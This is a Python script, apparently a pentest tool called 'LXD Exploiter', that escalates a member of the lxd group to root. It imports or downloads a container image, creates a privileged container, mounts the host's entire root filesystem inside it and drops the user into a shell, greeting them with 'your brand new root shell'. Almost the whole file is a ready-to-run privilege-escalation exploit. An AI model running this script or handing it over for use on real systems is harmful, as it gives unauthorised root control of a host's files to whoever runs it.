#!/usr/bin/python3
import os
import argparse
import requests
import pty
import subprocess




print('''


                      ██▓    ▒██   ██▒▓█████▄                          
                     ▓██▒    ▒▒ █ █ ▒░▒██▀ ██▌                         
                     ▒██░    ░░  █   ░░██   █▌                         
                     ▒██░     ░ █ █ ▒ ░▓█▄   ▌                         
                     ░██████▒▒██▒ ▒██▒░▒████▓                          
                     ░ ▒░▓  ░▒▒ ░ ░▓ ░ ▒▒▓  ▒                          
                     ░ ░ ▒  ░░░   ░▒ ░ ░ ▒  ▒                          
                       ░ ░    ░    ░   ░ ░  ░                          
                         ░  ░ ░    ░     ░                             
                                       ░                               
▓█████ ▒██   ██▒ ██▓███   ██▓     ▒█████   ██▓▄▄▄█████▓▓█████  ██▀███  
▓█   ▀ ▒▒ █ █ ▒░▓██░  ██▒▓██▒    ▒██▒  ██▒▓██▒▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒
▒███   ░░  █   ░▓██░ ██▓▒▒██░    ▒██░  ██▒▒██▒▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒
▒▓█  ▄  ░ █ █ ▒ ▒██▄█▓▒ ▒▒██░    ▒██   ██░░██░░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  
░▒████▒▒██▒ ▒██▒▒██▒ ░  ░░██████▒░ ████▓▒░░██░  ▒██▒ ░ ░▒████▒░██▓ ▒██▒
░░ ▒░ ░▒▒ ░ ░▓ ░▒▓▒░ ░  ░░ ▒░▓  ░░ ▒░▒░▒░ ░▓    ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░
 ░ ░  ░░░   ░▒ ░░▒ ░     ░ ░ ▒  ░  ░ ▒ ▒░  ▒ ░    ░     ░ ░  ░  ░▒ ░ ▒░
   ░    ░    ░  ░░         ░ ░   ░ ░ ░ ▒   ▒ ░  ░         ░     ░░   ░ 
   ░  ░ ░    ░               ░  ░    ░ ░   ░              ░  ░   ░     
                                                       BY: KimSchulz                                                                       

''') 
parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', action='store',help='url where the image should be fetches')
parser.add_argument('-i', '--image', action='store', help='image name if existing image is to be used')
parser.add_argument('-m', '--mount', action='store', help='path to use for mount point')
#TODO add check for group lxd


args = parser.parse_args()
imageFile = ''
mount = '/mnt/root'
if args.url != None:
    print('Getting image ', end='')
    imageFile = requests.get(args.url, allow_redirects=True)
    if args.url.find('/'):
        filename = args.url.rsplit('/', 1)[1]
        print(filename + '...', end='')
        open(filename, 'wb').write(imageFile.content)
    print('Done!') 
elif args.image != None:
    filename = args.image;
    print("Using image "+filename)
if(args.mount != None):
    mount = args.mount
    print('mount '+mount)

#start exploiting
print(''' 
╦  ┌─┐┌┬┐  ┌┬┐┬ ┬┌─┐  ┌─┐─┐ ┬┌─┐┬  ┌─┐┬┌┬┐┬┌┐┌┌─┐  ┌┐ ┌─┐┌─┐┬┌┐┌   
║  ├┤  │    │ ├─┤├┤   ├┤ ┌┴┬┘├─┘│  │ ││ │ │││││ ┬  ├┴┐├┤ │ ┬││││   
╩═╝└─┘ ┴    ┴ ┴ ┴└─┘  └─┘┴ └─┴  ┴─┘└─┘┴ ┴ ┴┘└┘└─┘  └─┘└─┘└─┘┴┘└┘ooo
''')
print('Import image...', end='')
cmd = 'lxc image import {} --alias privescimg'.format(filename)
print('Done!')
try:
    out = subprocess.check_output(cmd, shell=True)
except subprocess.CalledProcessError as e:
    print(e.output)

print('Init new image...', end='')
try:
    out = subprocess.check_output('echo "config: {}\nnetworks:\n- config:\n    ipv4.address: auto\n    ipv6.address: auto\n  description: \"\"\n  managed: false\n  name: lxdbr1\n  type: \"\"\nstorage_pools:\n- config:\n    size: 15GB\n  name: default2\n  driver: btrfs\nprofiles:\ncluster: null" > conf.yaml', shell=True)
except subprocess.CalledProcessError as e:
    print(e.output)
print('Done!')
try:
    out = subprocess.check_output('cat conf.yaml|lxd init --preseed', shell=True)
    out = subprocess.check_output('lxc init privescimg privesc -c security.privileged=true', shell=True)
except subprocess.CalledProcessError as e:
    print(e.output)
print('Config image with mount path {}...'.format(mount), end='')

try:
    out = subprocess.check_output('lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true', shell=True)
except subprocess.CalledProcessError as e:
    print(e.output)
print('Done!')

print('Staring image...', end='')
try:
    out = subprocess.check_output('lxc start privesc', shell=True)
except subprocess.CalledProcessError as e:
    print(e.output)
print('Done!')
print('''
(  _ \(  _  )(  _  )(_  _)  / __)( )_( )( ___)(  )  (  )   O 
 )   / )(_)(  )(_)(   )(    \__ \ ) _ (  )__)  )(__  )(__ 
(_)\_)(_____)(_____) (__)   (___/(_) (_)(____)(____)(____) O
''')
print('Let\'s go have fun with your brand new root shell - enjoy!')
try:
    subprocess.call('lxc exec privesc /bin/sh', shell=True)
except subprocess.CalledProcessError as e:
    print(e.output)
print('Cleaning up...', end='')
try:
    subprocess.call('rm -rf conf.yaml', shell=True)
    subprocess.call('lxc stop privesc', shell=True)
    subprocess.call('lxc delete privesc', shell=True)
    subprocess.call('lxc image delete privescimg', shell=True)
except subprocess.CalledProcessError as e:
    print(e.output)
print('Done!')

